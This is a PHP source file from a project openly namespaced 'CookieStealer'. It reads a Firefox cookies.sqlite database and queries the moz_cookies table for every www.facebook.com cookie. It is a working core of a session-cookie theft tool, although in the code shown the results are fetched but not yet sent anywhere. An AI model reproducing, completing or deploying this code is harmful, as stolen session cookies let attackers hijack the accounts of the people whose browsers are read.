<?php
/**
 * Copyright (c) 2020 Ramdhan Firmansyah
 * File              : main.php
 * @author           : Cvar1984 <gedzsarjuncomuniti@gmail.com>
 * Date              : 27.01.2021
 * Last Modified Date: 27.01.2021
 * Last Modified By  : Cvar1984 <gedzsarjuncomuniti@gmail.com>
 */

require './vendor/autoload.php';

use Cvar1984\CookieStealer\Modules\Singleton;

try {
    $pdoInstance = Singleton::make(new \PDO('sqlite:cookies.sqlite'));
    $pdoQuery = <<<SQL
select * from moz_cookies where baseDomain=:domain
SQL;
    $pdoPrepareAttribut = [\PDO::ATTR_CURSOR => \PDO::CURSOR_FWDONLY];
    $pdoStatement = $pdoInstance->prepare(
        $pdoQuery,
        $pdoPrepareAttribut
    );

    $pdoStatement->execute([
        ':domain' => 'www.facebook.com',
    ]);

    if(!$result = $pdoStatement->fetchAll(PDO::FETCH_OBJ)) {
        throw new \PDOException(
            'there is no entry data from given columns and tables'
        );
    }
} catch (\PDOException $e) {
    printf('Connection failed: %s%s', $e->getMessage(), PHP_EOL);
} finally {
    $pdoInstance = $pdoStatement = NULL;
}
